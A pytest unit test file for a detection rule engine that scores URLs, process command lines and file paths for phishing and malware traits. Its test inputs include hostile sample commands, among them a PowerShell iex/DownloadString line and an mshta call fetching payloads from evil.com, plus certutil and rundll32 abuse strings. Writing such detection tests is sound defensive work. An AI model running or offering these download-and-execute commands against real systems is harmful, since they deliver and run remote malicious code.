"""
tests/unit/test_rules.py
=========================
Unit tests for engine/rule_engine.py

Tests every rule in RuleEngine.analyze_url(), analyze_process(),
and analyze_file() with explicit inputs that should trigger each rule.
"""

import sys
import pytest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from engine.rule_engine import RuleEngine

@pytest.fixture(scope="module")
def re():
    return RuleEngine()


# ═══════════════════════════════════════════════════════════════
# analyze_url() — 10 Rules
# ═══════════════════════════════════════════════════════════════

class TestRuleEngineURL:

    # Rule 1 — IP as hostname
    def test_rule1_ip_in_url(self, re):
        r = re.analyze_url("http://192.168.1.100/login")
        assert r["flags"].get("ip_in_url"), "Rule 1: IP in URL not flagged"
        assert r["score"] > 0

    def test_rule1_no_ip(self, re):
        r = re.analyze_url("https://google.com")
        assert not r["flags"].get("ip_in_url")

    # Rule 2 — Excessive URL length
    def test_rule2_long_url(self, re):
        r = re.analyze_url("https://example.com/" + "a" * 100)
        assert r["flags"].get("url_length_excessive"), "Rule 2: Long URL not flagged"

    def test_rule2_short_url(self, re):
        r = re.analyze_url("https://google.com")
        assert not r["flags"].get("url_length_excessive")

    # Rule 3 — Hex encoding
    def test_rule3_hex_encoded(self, re):
        r = re.analyze_url("http://evil.com/%70%61%79%70%61%6C%2D%6C%6F%67%69%6E")
        assert r["flags"].get("hex_encoded_chars"), "Rule 3: Hex encoding not flagged"

    def test_rule3_no_hex(self, re):
        r = re.analyze_url("https://clean.example.com/page")
        assert not r["flags"].get("hex_encoded_chars")

    # Rule 4 — Suspicious keywords
    def test_rule4_keyword_login(self, re):
        r = re.analyze_url("https://paypal.verify-login.com/secure/account")
        assert r["flags"].get("suspicious_keywords"), "Rule 4: Keywords not flagged"

    def test_rule4_no_keywords(self, re):
        r = re.analyze_url("https://wikipedia.org/wiki/Python")
        assert not r["flags"].get("suspicious_keywords")

    # Rule 5 — Multiple subdomains
    def test_rule5_deep_subdomains(self, re):
        r = re.analyze_url("http://a.b.c.d.evil.com/page")
        assert r["flags"].get("multiple_subdomains"), "Rule 5: Subdomains not flagged"

    def test_rule5_normal_subdomain(self, re):
        r = re.analyze_url("https://www.example.com")
        assert not r["flags"].get("multiple_subdomains")

    # Rule 6 — HTTPS missing
    def test_rule6_http_flagged(self, re):
        r = re.analyze_url("http://example.com/login")
        assert r["flags"].get("https_missing"), "Rule 6: HTTP not flagged"

    def test_rule6_https_clean(self, re):
        r = re.analyze_url("https://example.com/login")
        assert not r["flags"].get("https_missing")

    # Rule 7 — URL shortener
    def test_rule7_bitly(self, re):
        r = re.analyze_url("https://bit.ly/3xSomething")
        assert r["flags"].get("url_shortener"), "Rule 7: Shortener not flagged"

    def test_rule7_tinyurl(self, re):
        r = re.analyze_url("https://tinyurl.com/abc123")
        assert r["flags"].get("url_shortener"), "Rule 7: tinyurl not flagged"

    def test_rule7_no_shortener(self, re):
        r = re.analyze_url("https://full-domain.example.com/page")
        assert not r["flags"].get("url_shortener")

    # Rule 9 — Double extension
    def test_rule9_double_ext_exe(self, re):
        r = re.analyze_url("https://evil.com/invoice.pdf.exe.com")
        assert r["flags"].get("double_extension"), "Rule 9: Double extension not flagged"

    def test_rule9_ps1_double(self, re):
        r = re.analyze_url("https://evil.com/script.ps1.fake")
        assert r["flags"].get("double_extension"), "Rule 9: .ps1 double extension not flagged"

    # Rule 10 — @ symbol
    def test_rule10_at_symbol(self, re):
        r = re.analyze_url("http://user@attacker.com/page")
        assert r["flags"].get("at_symbol_in_url"), "Rule 10: @ not flagged"

    def test_rule10_no_at(self, re):
        r = re.analyze_url("https://google.com/search?q=test@example")
        # @ in query string context should be flagged (it's in the URL)
        assert isinstance(r["flags"], dict)

    # Score boundary
    def test_score_never_exceeds_100(self, re):
        worst = "http://192.168.1.1/paypal-login-verify/secure/account%20update%40user.exe.bat?a=" + "x" * 200
        r = re.analyze_url(worst)
        assert r["score"] <= 100

    def test_score_never_negative(self, re):
        r = re.analyze_url("https://google.com")
        assert r["score"] >= 0

    def test_returns_all_keys(self, re):
        r = re.analyze_url("https://example.com")
        assert "score"   in r
        assert "reasons" in r
        assert "flags"   in r


# ═══════════════════════════════════════════════════════════════
# analyze_process()
# ═══════════════════════════════════════════════════════════════

class TestRuleEngineProcess:

    def test_clean_process_zero(self, re):
        r = re.analyze_process("notepad.exe", "notepad.exe C:\\file.txt")
        assert r["score"] == 0
        assert r["reasons"] == []

    def test_powershell_encoded_command(self, re):
        r = re.analyze_process("powershell.exe", "powershell.exe -EncodedCommand SGVsbG8gV29ybGQ=")
        assert r["score"] >= 25
        assert any("encoded" in reason.lower() for reason in r["reasons"])

    def test_powershell_downloadstring(self, re):
        r = re.analyze_process("powershell.exe", "powershell.exe -nop -c iex (New-Object Net.WebClient).DownloadString('http://evil.com')")
        assert r["score"] >= 50
        assert len(r["reasons"]) >= 2

    def test_powershell_hidden_window(self, re):
        r = re.analyze_process("pwsh.exe", "pwsh.exe -WindowStyle Hidden -Command ...")
        assert r["score"] >= 25

    def test_powershell_bypass(self, re):
        r = re.analyze_process("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File evil.ps1")
        assert r["score"] >= 25

    def test_certutil_abuse(self, re):
        r = re.analyze_process("cmd.exe", "certutil -decode payload.b64 payload.exe")
        assert r["score"] >= 20
        assert any("certutil" in reason.lower() for reason in r["reasons"])

    def test_mshta_flagged(self, re):
        r = re.analyze_process("cmd.exe", "mshta.exe http://evil.com/payload.hta")
        assert r["score"] >= 20

    def test_rundll32_flagged(self, re):
        r = re.analyze_process("cmd.exe", "rundll32.exe javascript:'..\\mshtml,RunHTMLApplication'")
        assert r["score"] >= 20

    def test_known_malicious_tool(self, re):
        import config
        if not config.BLOCKED_PROCESSES:
            pytest.skip("No blocked processes configured")
        bad = list(config.BLOCKED_PROCESSES)[0]
        r = re.analyze_process(bad, "")
        assert r["score"] >= 90

    def test_score_capped_100(self, re):
        r = re.analyze_process(
            "powershell.exe",
            "powershell -EncodedCommand abc -enc abc -nop -WindowStyle hidden -c DownloadString iex bypass"
        )
        assert r["score"] <= 100


# ═══════════════════════════════════════════════════════════════
# analyze_file()
# ═══════════════════════════════════════════════════════════════

class TestRuleEngineFile:

    def test_clean_txt_file(self, re):
        r = re.analyze_file(r"C:\Users\user\Documents\report.txt")
        assert r["score"] == 0
        assert r["reasons"] == []

    def test_exe_in_temp(self, re):
        r = re.analyze_file(r"C:\Users\user\AppData\Local\Temp\payload.exe")
        assert r["score"] >= 35  # dangerous ext (20) + temp dir (15)
        assert any("extension" in reason.lower() for reason in r["reasons"])
        assert any("temp" in reason.lower() for reason in r["reasons"])

    def test_bat_file_flagged(self, re):
        r = re.analyze_file(r"C:\Downloads\install.bat")
        assert r["score"] >= 20

    def test_ps1_in_startup(self, re):
        r = re.analyze_file(r"C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1")
        assert r["score"] >= 45  # dangerous ext + startup dir

    def test_double_extension(self, re):
        r = re.analyze_file(r"C:\Downloads\invoice.pdf.exe")
        assert r["score"] >= 35  # dangerous ext + double ext
        assert any("double" in reason.lower() for reason in r["reasons"])

    def test_pdf_not_flagged(self, re):
        r = re.analyze_file(r"C:\Documents\report.pdf")
        assert r["score"] == 0

    def test_vbs_flagged(self, re):
        r = re.analyze_file(r"C:\temp\updater.vbs")
        assert r["score"] >= 35  # dangerous ext + temp

    def test_score_bounded(self, re):
        r = re.analyze_file(r"C:\Users\user\AppData\Local\Temp\malware.pdf.exe")
        assert 0 <= r["score"] <= 100

    def test_returns_required_fields(self, re):
        r = re.analyze_file(r"C:\file.exe")
        assert "score"   in r
        assert "reasons" in r
